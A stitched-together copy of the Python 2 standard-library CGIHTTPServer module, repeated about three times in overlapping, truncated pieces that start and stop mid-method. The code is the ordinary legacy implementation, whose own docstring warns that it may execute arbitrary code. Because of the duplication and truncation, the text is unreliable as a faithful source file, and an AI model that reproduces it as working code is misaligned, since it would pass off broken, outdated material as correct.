        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
